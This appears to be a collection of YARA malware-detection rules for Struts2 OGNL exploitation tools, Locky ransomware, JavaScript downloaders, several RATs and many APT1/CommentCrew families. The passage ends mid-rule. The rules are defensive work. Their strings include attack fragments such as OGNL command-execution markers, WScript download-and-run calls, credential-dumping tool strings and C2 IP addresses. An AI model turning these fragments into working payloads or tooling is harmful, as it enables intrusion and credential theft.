/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/
rule Struts2_hacktool
{
	strings:
	
		$a1="method:%23_memberAccess%3d@"
		$a2="ognl.OgnlContext@DEFAULT_MEMBER_ACCESS"
		$a3="org.apache.struts2.ServletActionContext"
		$a4="40getResponse()"
		$a5="res.setCharacterEncoding"
		$a6="org.apache.struts2.ServletActionContext"
		$a7="res.getWriter()"
		$a8="cmd"
		$a9="java.util.Scanner"
		$a10="parameters"
		$a11="request.toString"
		$a12="getResponse()"
		$m1="method"
		$b1="setExcludedClasses"
		$b2="java.util.Collections"
		$b3="setExcludedPackageNamePatterns"
		$b4="java.util.Collections"
		$b5="parameters.cmd"
		$b6="java.lang.ProcessBuilder"
		$b7="cmd"
		$b8="getInputStream()"
	condition:
		(8 of($a*) and 1 of ($m*)) or (7 of ($b*) and 1 of ($m*))
}
rule Locky_Ransomware {
	meta:
		description = "Detects Locky Ransomware (matches also on Win32/Kuluoz)"
		author = "polydata"
		date = "2016-03-17"
		hash = "5e945c1d27c9ad77a2b63ae10af46aee7d29a6a43605a9bfbf35cebbcff184d8"
	strings:
		$o1 = { 69 69 69 FF 7E 7E 7E FF D7 B1 85 EB E7 B8 89 FF } // address=0x4144a7
		$o2 = { 6F 71 72 FF 84 82 80 EA E8 BA 8C FF E8 BB 8E FF } // address=0x413863
	condition:
		all of ($o*)
}
rule js_downloader
{
	strings:
	
		$a1="WScript.Shell"
		$a2="WScript.CreateObject"
		$a3="WshShell[Run]"
		$a4="GET"
		$a5="(fname, 0, 0)"
		$b1="String.fromCharCode"
		$b2="hexcase"
		$w="function"
		$y="return"
	condition:
		#w>340 or #y >100 or 2 of($a*) or 1 of ($b*)
}


rule Adzok
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		Description = "Adzok Rat"
		Versions = "Free 1.0.0.3,"
		date = "2015/05"
		ref = "http://malwareconfig.com/stats/Adzok"
		maltype = "Remote Access Trojan"
		filetype = "jar"

	strings:
		$a1 = "config.xmlPK"
		$a2 = "key.classPK"
		$a3 = "svd$1.classPK"
		$a4 = "svd$2.classPK"
		$a5 = "Mensaje.classPK"
		$a6 = "inic$ShutdownHook.class"
		$a7 = "Uninstall.jarPK"
		$a8 = "resources/icono.pngPK"
        
	condition:
    7 of ($a*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule alina {
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2014-08-09"
        description = "Identify Alina"
	strings:
    	$s1 = "Alina v1.0"
        $s2 = "POST"
        $s3 = "1[0-2])[0-9]"
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule andromeda
{
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2014-03-13"
        description = "Identify Andromeda"
    strings:
        $config = {1c 1c 1d 03 49 47 46}
        $c1 = "hsk\\ehs\\dihviceh\\serhlsethntrohntcohurrehem\\chsyst"
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

import "pe"


/* Anthem Deep Panda APT */

rule Anthem_DeepPanda_sl_txt_packed {
	meta:
		description = "Anthem Hack Deep Panda - ScanLine sl-txt-packed"
		author = "Florian Roth"
		date = "2015/02/08"
		hash = "ffb1d8ea3039d3d5eb7196d27f5450cac0ea4f34"
	strings:
		$s0 = "Command line port scanner" fullword wide
		$s1 = "sl.exe" fullword wide
		$s2 = "CPports.txt" fullword ascii
		$s3 = ",GET / HTTP/.}" fullword ascii
		$s4 = "Foundstone Inc." fullword wide
		$s9 = " 2002 Foundstone Inc." fullword wide
		$s15 = ", Inc. 2002" fullword ascii
		$s20 = "ICMP Time" fullword ascii
	condition:
		all of them
}

rule Anthem_DeepPanda_lot1 {
	meta:
		description = "Anthem Hack Deep Panda - lot1.tmp-pwdump"
		author = "Florian Roth"
		date = "2015/02/08"
		hash = "5d201a0fb0f4a96cefc5f73effb61acff9c818e1"
	strings:
		$s0 = "Unable to open target process: %d, pid %d" fullword ascii
		$s1 = "Couldn't delete target executable from remote machine: %d" fullword ascii
		$s2 = "Target: Failed to load SAM functions." fullword ascii
		$s5 = "Error writing the test file %s, skipping this share" fullword ascii
		$s6 = "Failed to create service (%s/%s), error %d" fullword ascii
		$s8 = "Service start failed: %d (%s/%s)" fullword ascii
		$s12 = "PwDump.exe" fullword ascii
		$s13 = "GetAvailableWriteableShare returned an error of %ld" fullword ascii
		$s14 = ":\\\\.\\pipe\\%s" fullword ascii
		$s15 = "Couldn't copy %s to destination %s. (Error %d)" fullword ascii
		$s16 = "dump logon session" fullword ascii
		$s17 = "Timed out waiting to get our pipe back" fullword ascii
		$s19 = "SetNamedPipeHandleState failed, error %d" fullword ascii
		$s20 = "%s\\%s.exe" fullword ascii
	condition:
		10 of them
}

rule Anthem_DeepPanda_htran_exe {
	meta:
		description = "Anthem Hack Deep Panda - htran-exe"
		author = "Florian Roth"
		date = "2015/02/08"
		hash = "38e21f0b87b3052b536408fdf59185f8b3d210b9"
	strings:
		$s0 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
		$s1 = "[-] Gethostbyname(%s) error:%s" fullword ascii
		$s2 = "e:\\VS 2008 Project\\htran\\Release\\htran.pdb" fullword ascii
		$s3 = "[SERVER]connection to %s:%d error" fullword ascii
		$s4 = "-tran  <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
		$s5 = "[-] ERROR: Must supply logfile name." fullword ascii
		$s6 = "[-] There is a error...Create a new connection." fullword ascii
		$s7 = "[+] Accept a Client on port %d from %s" fullword ascii
		$s8 = "======================== htran V%s =======================" fullword ascii
		$s9 = "[-] Socket Listen error." fullword ascii
		$s10 = "[-] ERROR: open logfile" fullword ascii
		$s11 = "-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
		$s12 = "[+] Make a Connection to %s:%d ......" fullword ascii
		$s14 = "Recv %5d bytes from %s:%d" fullword ascii
		$s15 = "[+] OK! I Closed The Two Socket." fullword ascii
		$s16 = "[+] Waiting another Client on port:%d...." fullword ascii
		$s17 = "[+] Accept a Client on port %d from %s ......" fullword ascii
		$s20 = "-listen <ConnectPort> <TransmitPort>" fullword ascii
	condition:
		10 of them
}

rule Anthem_DeepPanda_Trojan_Kakfum {
	meta:
		description = "Anthem Hack Deep Panda - Trojan.Kakfum sqlsrv32.dll"
		author = "Florian Roth"
		date = "2015/02/08"
		hash1 = "ab58b6aa7dcc25d8f6e4b70a24e0ccede0d5f6129df02a9e61293c1d7d7640a2"
		hash2 = "c6c3bb72896f8f0b9a5351614fd94e889864cf924b40a318c79560bbbcfa372f"
	strings:
		$s0 = "%SystemRoot%\\System32\\svchost.exe -k sqlserver" fullword ascii
		$s1 = "%s\\sqlsrv32.dll" fullword ascii
		$s2 = "%s\\sqlsrv64.dll" fullword ascii
		$s3 = "%s\\%d.tmp" fullword ascii
		$s4 = "ServiceMaix" fullword ascii
		$s15 = "sqlserver" fullword ascii
	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule LIGHTDART_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "ret.log" wide ascii
                $s2 = "Microsoft Internet Explorer 6.0" wide ascii
                $s3 = "szURL Fail" wide ascii
                $s4 = "szURL Successfully" wide ascii
                $s5 = "%s&sdate=%04ld-%02ld-%02ld" wide ascii
        condition:
                all of them
}

rule AURIGA_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "superhard corp." wide ascii
                $s2 = "microsoft corp." wide ascii
                $s3 = "[Insert]" wide ascii
                $s4 = "[Delete]" wide ascii
                $s5 = "[End]" wide ascii
                $s6 = "!(*@)(!@KEY" wide ascii
                $s7 = "!(*@)(!@SID=" wide ascii
        condition:
                all of them
}

rule AURIGA_driver_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "Services\\riodrv32" wide ascii
                $s2 = "riodrv32.sys" wide ascii
                $s3 = "svchost.exe" wide ascii
                $s4 = "wuauserv.dll" wide ascii
                $s5 = "arp.exe" wide ascii
                $pdb = "projects\\auriga" wide ascii

        condition:
                all of ($s*) or $pdb
}

rule BANGAT_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "superhard corp." wide ascii
                $s2 = "microsoft corp." wide ascii
                $s3 = "[Insert]" wide ascii
                $s4 = "[Delete]" wide ascii
                $s5 = "[End]" wide ascii
                $s6 = "!(*@)(!@KEY" wide ascii
                $s7 = "!(*@)(!@SID=" wide ascii
                $s8 = "end      binary output" wide ascii
                $s9 = "XriteProcessMemory" wide ascii
                $s10 = "IE:Password-Protected sites" wide ascii
                $s11 = "pstorec.dll" wide ascii

        condition:
                all of them
}

rule BISCUIT_GREENCAT_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "zxdosml" wide ascii
                $s2 = "get user name error!" wide ascii
                $s3 = "get computer name error!" wide ascii
                $s4 = "----client system info----" wide ascii
                $s5 = "stfile" wide ascii
                $s6 = "cmd success!" wide ascii

        condition:
                all of them
}

rule BOUNCER_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "*Qd9kdgba33*%Wkda0Qd3kvn$*&><(*&%$E#%$#1234asdgKNAg@!gy565dtfbasdg" wide ascii
                $s2 = "IDR_DATA%d" wide ascii

                $s3 = "asdfqwe123cxz" wide ascii
                $s4 = "Mode must be 0(encrypt) or 1(decrypt)." wide ascii

        condition:
                ($s1 and $s2) or ($s3 and $s4)

}

rule BOUNCER_DLL_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "new_connection_to_bounce():" wide ascii
                $s2 = "usage:%s IP port [proxip] [port] [key]" wide ascii

        condition:
                all of them
}

rule CALENDAR_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "content" wide ascii
                $s2 = "title" wide ascii
                $s3 = "entry" wide ascii
                $s4 = "feed" wide ascii
                $s5 = "DownRun success" wide ascii
                $s6 = "%s@gmail.com" wide ascii
                $s7 = "<!--%s-->" wide ascii

                $b8 = "W4qKihsb+So=" wide ascii
                $b9 = "PoqKigY7ggH+VcnqnTcmhFCo9w==" wide ascii
                $b10 = "8oqKiqb5880/uJLzAsY=" wide ascii

        condition:
                all of ($s*) or all of ($b*)
}

rule COMBOS_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "Mozilla4.0 (compatible; MSIE 7.0; Win32)" wide ascii
                $s2 = "Mozilla5.1 (compatible; MSIE 8.0; Win32)" wide ascii
                $s3 = "Delay" wide ascii
                $s4 = "Getfile" wide ascii
                $s5 = "Putfile" wide ascii
                $s6 = "---[ Virtual Shell]---" wide ascii
                $s7 = "Not Comming From Our Server %s." wide ascii


        condition:
                all of them
}

rule DAIRY_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "Mozilla/4.0 (compatible; MSIE 7.0;)" wide ascii
                $s2 = "KilFail" wide ascii
                $s3 = "KilSucc" wide ascii
                $s4 = "pkkill" wide ascii
                $s5 = "pklist" wide ascii


        condition:
                all of them
}

rule GLOOXMAIL_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "Kill process success!" wide ascii
                $s2 = "Kill process failed!" wide ascii
                $s3 = "Sleep success!" wide ascii
                $s4 = "based on gloox" wide ascii

                $pdb = "glooxtest.pdb" wide ascii

        condition:
                all of ($s*) or $pdb
}

rule GOGGLES_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "Kill process success!" wide ascii
                $s2 = "Kill process failed!" wide ascii
                $s3 = "Sleep success!" wide ascii
                $s4 = "based on gloox" wide ascii

                $pdb = "glooxtest.pdb" wide ascii

        condition:
                all of ($s*) or $pdb
}

rule HACKSFASE1_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = {cb 39 82 49 42 be 1f 3a}

        condition:
                all of them
}

rule HACKSFASE2_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "Send to Server failed." wide ascii
                $s2 = "HandShake with the server failed. Error:" wide ascii
                $s3 = "Decryption Failed. Context Expired." wide ascii

        condition:
                all of them
}

rule KURTON_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "Mozilla/4.0 (compatible; MSIE8.0; Windows NT 5.1)" wide ascii
                $s2 = "!(*@)(!@PORT!(*@)(!@URL" wide ascii
                $s3 = "MyTmpFile.Dat" wide ascii
                $s4 = "SvcHost.DLL.log" wide ascii

        condition:
                all of them
}

rule LONGRUN_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "Mozilla/4.0 (compatible; Windows NT 5.1; MSIE 7.0; Trident/4.0)" wide ascii
                $s2 = "%s\\%c%c%c%c%c%c%c" wide ascii
                $s3 = "wait:" wide ascii
                $s4 = "Dcryption Error! Invalid Character" wide ascii

        condition:
                all of them
}

rule MACROMAIL_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "svcMsn.dll" wide ascii
                $s2 = "RundllInstall" wide ascii
                $s3 = "Config service %s ok." wide ascii
                $s4 = "svchost.exe" wide ascii

        condition:
                all of them
}

rule MANITSME_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "Install an Service hosted by SVCHOST." wide ascii
                $s2 = "The Dll file that to be released." wide ascii
                $s3 = "SYSTEM\\CurrentControlSet\\Services\\" wide ascii
                $s4 = "svchost.exe" wide ascii

                $e1 = "Man,it's me" wide ascii
                $e2 = "Oh,shit" wide ascii
                $e3 = "Hallelujah" wide ascii
                $e4 = "nRet == SOCKET_ERROR" wide ascii

                $pdb1 = "rouji\\release\\Install.pdb" wide ascii
                $pdb2 = "rouji\\SvcMain.pdb" wide ascii

        condition:
                (all of ($s*)) or (all of ($e*)) or $pdb1 or $pdb2
}

rule MINIASP_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "miniasp" wide ascii
                $s2 = "wakeup=" wide ascii
                $s3 = "download ok!" wide ascii
                $s4 = "command is null!" wide ascii
                $s5 = "device_input.asp?device_t=" wide ascii


        condition:
                all of them
}

rule NEWSREELS_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "Mozilla/4.0 (compatible; Windows NT 5.1; MSIE 7.0)" wide ascii
                $s2 = "name=%s&userid=%04d&other=%c%s" wide ascii
                $s3 = "download ok!" wide ascii
                $s4 = "command is null!" wide ascii
                $s5 = "noclient" wide ascii
                $s6 = "wait" wide ascii
                $s7 = "active" wide ascii
                $s8 = "hello" wide ascii


        condition:
                all of them
}

rule SEASALT_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.00; Windows 98) KSMM" wide ascii
                $s2 = "upfileok" wide ascii
                $s3 = "download ok!" wide ascii
                $s4 = "upfileer" wide ascii
                $s5 = "fxftest" wide ascii


        condition:
                all of them
}


rule STARSYPOUND_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "*(SY)# cmd" wide ascii
                $s2 = "send = %d" wide ascii
                $s3 = "cmd.exe" wide ascii
                $s4 = "*(SY)#" wide ascii


        condition:
                all of them
}

rule SWORD_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "@***@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>>>" wide ascii
                $s2 = "sleep:" wide ascii
                $s3 = "down:" wide ascii
                $s4 = "*========== Bye Bye ! ==========*" wide ascii


        condition:
                all of them
}


rule thequickbrow_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "thequickbrownfxjmpsvalzydg" wide ascii


        condition:
                all of them
}


rule TABMSGSQL_APT1 {
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

        strings:
                $s1 = "letusgohtppmmv2.0.0.1" wide ascii
                $s2 = "Mozilla/4.0 (compatible; )" wide ascii
                $s3 = "filestoc" wide ascii
                $s4 = "filectos" wide ascii
                $s5 = "reshell" wide ascii

        condition:
                all of them
}

rule CCREWBACK1
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "postvalue" wide ascii
    $b = "postdata" wide ascii
    $c = "postfile" wide ascii
    $d = "hostname" wide ascii
    $e = "clientkey" wide ascii
    $f = "start Cmd Failure!" wide ascii
    $g = "sleep:" wide ascii
    $h = "downloadcopy:" wide ascii
    $i = "download:" wide ascii
    $j = "geturl:" wide ascii
    $k = "1.234.1.68" wide ascii

  condition:
    4 of ($a,$b,$c,$d,$e) or $f or 3 of ($g,$h,$i,$j) or $k
}

rule TrojanCookies_CCREW
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "sleep:" wide ascii
    $b = "content=" wide ascii
    $c = "reqpath=" wide ascii
    $d = "savepath=" wide ascii
    $e = "command=" wide ascii


  condition:
    4 of ($a,$b,$c,$d,$e)
}

rule GEN_CCREW1
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "W!r@o#n$g" wide ascii
    $b = "KerNel32.dll" wide ascii

  condition:
    any of them
}

rule Elise
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "SetElise.pdb" wide ascii

  condition:
    $a
}

rule EclipseSunCloudRAT
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "Eclipse_A" wide ascii
    $b = "\\PJTS\\" wide ascii
    $c = "Eclipse_Client_B.pdb" wide ascii
    $d = "XiaoME" wide ascii
    $e = "SunCloud-Code" wide ascii
    $f = "/uc_server/data/forum.asp" wide ascii

  condition:
    any of them
}

rule MoonProject
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "Serverfile is smaller than Clientfile" wide ascii
    $b = "\\M tools\\" wide ascii
    $c = "MoonDLL" wide ascii
        $d = "\\M tools\\" wide ascii

  condition:
    any of them
}

rule ccrewDownloader1
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = {DD B5 61 F0 20 47 20 57 D6 65 9C CB 31 1B 65 42}

  condition:
    any of them
}

rule ccrewDownloader2
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "3gZFQOBtY3sifNOl" wide ascii
        $b = "docbWUWsc2gRMv9HN7TFnvnKcrWUUFdAEem9DkqRALoD" wide ascii
        $c = "6QVSOZHQPCMc2A8HXdsfuNZcmUnIqWrOIjrjwOeagILnnScxadKEr1H2MZNwSnaJ" wide ascii

  condition:
    any of them
}


rule ccrewMiniasp
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "MiniAsp.pdb" wide ascii
    $b = "device_t=" wide ascii

  condition:
    any of them
}


rule ccrewSSLBack2
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = {39 82 49 42 BE 1F 3A}

  condition:
    any of them
}

rule ccrewSSLBack3
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "SLYHKAAY" wide ascii

  condition:
    any of them
}


rule ccrewSSLBack1
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "!@#%$^#@!" wide ascii
    $b = "64.91.80.6" wide ascii

  condition:
    any of them
}

rule ccrewDownloader3
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "ejlcmbv" wide ascii
        $b = "bhxjuisv" wide ascii
        $c = "yqzgrh" wide ascii
        $d = "uqusofrp" wide ascii
        $e = "Ljpltmivvdcbb" wide ascii
        $f = "frfogjviirr" wide ascii
        $g = "ximhttoskop" wide ascii
  condition:
    4 of them
}


rule ccrewQAZ
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "!QAZ@WSX" wide ascii

  condition:
    $a
}

rule metaxcd
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "<meta xcd=" wide ascii

  condition:
    $a
}

rule MiniASP
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

strings:
    $KEY = { 71 30 6E 63 39 77 38 65 64 61 6F 69 75 6B 32 6D 7A 72 66 79 33 78 74 31 70 35 6C 73 36 37 67 34 62 76 68 6A }
    $PDB = "MiniAsp.pdb" nocase wide ascii

condition:
    any of them
}

rule DownloaderPossibleCCrew
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

  strings:
    $a = "%s?%.6u" wide ascii
    $b = "szFileUrl=%s" wide ascii
    $c = "status=%u" wide ascii
    $d = "down file success" wide ascii
        $e = "Mozilla/4.0 (compatible; MSIE 6.0; Win32)" wide ascii

  condition:
    all of them
}

rule APT1_MAPIGET
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $s1 = "%s\\Attachment.dat" wide ascii
        $s2 = "MyOutlook" wide ascii
        $s3 = "mail.txt" wide ascii
        $s4 = "Recv Time:" wide ascii
        $s5 = "Subject:" wide ascii

    condition:
        all of them
}

rule APT1_LIGHTBOLT
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $str1 = "bits.exe" wide ascii
        $str2 = "PDFBROW" wide ascii
        $str3 = "Browser.exe" wide ascii
        $str4 = "Protect!" wide ascii
    condition:
        2 of them
}

rule APT1_GETMAIL
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $stra1 = "pls give the FULL path" wide ascii
        $stra2 = "mapi32.dll" wide ascii
        $stra3 = "doCompress" wide ascii

        $strb1 = "getmail.dll" wide ascii
        $strb2 = "doCompress" wide ascii
        $strb3 = "love" wide ascii
    condition:
        all of ($stra*) or all of ($strb*)
}

rule APT1_GDOCUPLOAD
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $str1 = "name=\"GALX\"" wide ascii
        $str2 = "User-Agent: Shockwave Flash" wide ascii
        $str3 = "add cookie failed..." wide ascii
        $str4 = ",speed=%f" wide ascii
    condition:
        3 of them
}

rule APT1_WEBC2_Y21K
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $1 = "Y29ubmVjdA" wide ascii // connect
        $2 = "c2xlZXA" wide ascii // sleep
        $3 = "cXVpdA" wide ascii // quit
        $4 = "Y21k" wide ascii // cmd
        $5 = "dW5zdXBwb3J0" wide ascii // unsupport
    condition:
        4 of them
}

rule APT1_WEBC2_YAHOO
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $http1 = "HTTP/1.0" wide ascii
        $http2 = "Content-Type:" wide ascii
        $uagent = "IPHONE8.5(host:%s,ip:%s)" wide ascii
    condition:
        all of them
}

rule APT1_WEBC2_UGX
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $persis = "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN" wide ascii
        $exe = "DefWatch.exe" wide ascii
        $html = "index1.html" wide ascii
        $cmd1 = "!@#tiuq#@!" wide ascii
        $cmd2 = "!@#dmc#@!" wide ascii
        $cmd3 = "!@#troppusnu#@!" wide ascii
    condition:
        3 of them
}

rule APT1_WEBC2_TOCK
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $1 = "InprocServer32" wide ascii
        $2 = "HKEY_PERFORMANCE_DATA" wide ascii
        $3 = "<!---[<if IE 5>]id=" wide ascii
    condition:
        all of them
}

rule APT1_WEBC2_TABLE
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $msg1 = "Fail To Execute The Command" wide ascii
        $msg2 = "Execute The Command Successfully" wide ascii
        /*
	$gif1 = /\w+\.gif/
	*/
        $gif2 = "GIF89" wide ascii
    condition:
        3 of them
}

rule APT1_WEBC2_RAVE
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $1 = "iniet.exe" wide ascii
        $2 = "cmd.exe" wide ascii
        $3 = "SYSTEM\\CurrentControlSet\\Services\\DEVFS" wide ascii
        $4 = "Device File System" wide ascii
    condition:
        3 of them
}

rule APT1_WEBC2_QBP
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $1 = "2010QBP" wide ascii
        $2 = "adobe_sl.exe" wide ascii
        $3 = "URLDownloadToCacheFile" wide ascii
        $4 = "dnsapi.dll" wide ascii
        $5 = "urlmon.dll" wide ascii
    condition:
        4 of them
}

rule APT1_WEBC2_HEAD
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $1 = "Ready!" wide ascii
        $2 = "connect ok" wide ascii
        $3 = "WinHTTP 1.0" wide ascii
        $4 = "<head>" wide ascii
    condition:
        all of them
}

rule APT1_WEBC2_GREENCAT
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $1 = "reader_sl.exe" wide ascii
        $2 = "MS80547.bat" wide ascii
        $3 = "ADR32" wide ascii
        $4 = "ControlService failed!" wide ascii
    condition:
        3 of them
}

rule APT1_WEBC2_DIV
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $1 = "3DC76854-C328-43D7-9E07-24BF894F8EF5" wide ascii
        $2 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide ascii
        $3 = "Hello from MFC!" wide ascii
        $4 = "Microsoft Internet Explorer" wide ascii
    condition:
        3 of them
}

rule APT1_WEBC2_CSON
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $httpa1 = "/Default.aspx?INDEX=" wide ascii
        $httpa2 = "/Default.aspx?ID=" wide ascii
        $httpb1 = "Win32" wide ascii
        $httpb2 = "Accept: text*/*" wide ascii
        $exe1 = "xcmd.exe" wide ascii
        $exe2 = "Google.exe" wide ascii
    condition:
        1 of ($exe*) and 1 of ($httpa*) and all of ($httpb*)
}

rule APT1_WEBC2_CLOVER
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $msg1 = "BUILD ERROR!" wide ascii
        $msg2 = "SUCCESS!" wide ascii
        $msg3 = "wild scan" wide ascii
        $msg4 = "Code too clever" wide ascii
        $msg5 = "insufficient lookahead" wide ascii
        $ua1 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)" wide ascii
        $ua2 = "Mozilla/5.0 (Windows; Windows NT 5.1; en-US; rv:1.8.0.12) Firefox/1.5.0.12" wide ascii
    condition:
        2 of ($msg*) and 1 of ($ua*)
}

rule APT1_WEBC2_BOLID
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $vm = "VMProtect" wide ascii
        $http = "http://[c2_location]/[page].html" wide ascii
    condition:
        all of them
}

rule APT1_WEBC2_ADSPACE
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $1 = "<!---HEADER ADSPACE style=" wide ascii
        $2 = "ERSVC.DLL" wide ascii
    condition:
        all of them
}

rule APT1_WEBC2_AUSOV
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $1 = "ntshrui.dll" wide ascii
        $2 = "%SystemRoot%\\System32\\" wide ascii
        $3 = "<!--DOCHTML" wide ascii
        $4 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" wide ascii
        $5 = "Ausov" wide ascii
    condition:
        4 of them
}

rule APT1_WARP
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $err1 = "exception..." wide ascii
        $err2 = "failed..." wide ascii
        $err3 = "opened..." wide ascii
        $exe1 = "cmd.exe" wide ascii
        $exe2 = "ISUN32.EXE" wide ascii
    condition:
        2 of ($err*) and all of ($exe*)
}

rule APT1_TARSIP_ECLIPSE
{
    meta:
        author = "AlienVault Labs"
